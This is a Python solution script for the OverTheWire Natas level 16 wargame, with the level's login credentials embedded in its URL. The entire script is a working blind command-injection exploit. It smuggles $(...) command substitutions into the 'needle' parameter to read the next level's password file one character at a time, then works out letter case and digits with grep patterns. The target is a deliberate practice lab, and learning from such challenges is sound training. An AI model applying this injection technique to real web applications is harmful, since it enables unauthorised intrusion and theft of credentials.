import requests
import string
import itertools

url = "http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org"

#############################
# Retrieve lowercase password

potential_passwd = ""
passwd_len = 32
for i in range(len(potential_passwd), passwd_len):
	cmd = f"^$(expr substr $(cat /etc/natas_webpass/natas17) {i+1} 1)"

	r = requests.get(url, params={'needle': cmd})

	resp = r.text.split('Output:\n<pre>')[1].split("</pre>")[0]

	dict_values = resp.split('\n')[1:-1]

	if len(dict_values) > 0:
		potential_passwd += dict_values[0][0].lower()
		print(f"Got a char -- {potential_passwd}")
	else:
		# This is probably a number
		print("Got a potential number")
		potential_passwd += "#"

print(f"Potential password : {potential_passwd}")

###########################
# Determine casing & digits

# Number of line in the complete dictionary.txt file
full_dict_len = 50000
so_far = ""
for i, char in enumerate(potential_passwd):
	char_left = 32 - len(so_far) - 1
	if char == "#":
		for digit in string.digits:
			trying = so_far + str(digit)
			print(f"Trying '{trying}'")

			cmd = f"^$(expr substr $(grep -E ^{trying}[a-zA-Z0-9]\\{{{char_left}\\}}\\$ /etc/natas_webpass/natas17) 2 1)"

			r = requests.get(url, params={'needle': cmd})

			resp = r.text.split('Output:\n<pre>')[1].split("</pre>")[0]
			dict_values = resp.split('\n')[1:-1]

			if 0 < len(dict_values) < full_dict_len:
				so_far += str(digit)
				print(f"Got a HIT --- {so_far}")
				break
	else:
		lowercase = True
		for j in range(2):
			trying_char = char.lower() if lowercase else char.upper()
			trying = so_far + trying_char
			print(f"Trying '{trying}'")

			cmd = f"^$(expr substr $(grep -E ^{trying}[a-zA-Z0-9]\\{{{char_left}\\}}\\$ /etc/natas_webpass/natas17) 2 1)"

			r = requests.get(url, params={'needle': cmd})

			resp = r.text.split('Output:\n<pre>')[1].split("</pre>")[0]
			dict_values = resp.split('\n')[1:-1]

			if 0 < len(dict_values) < full_dict_len:
				so_far += trying_char
				print(f"Got a HIT --- {so_far}")
				break
			else:
				lowercase = not lowercase

print(f"Natas17 password is '{so_far}'")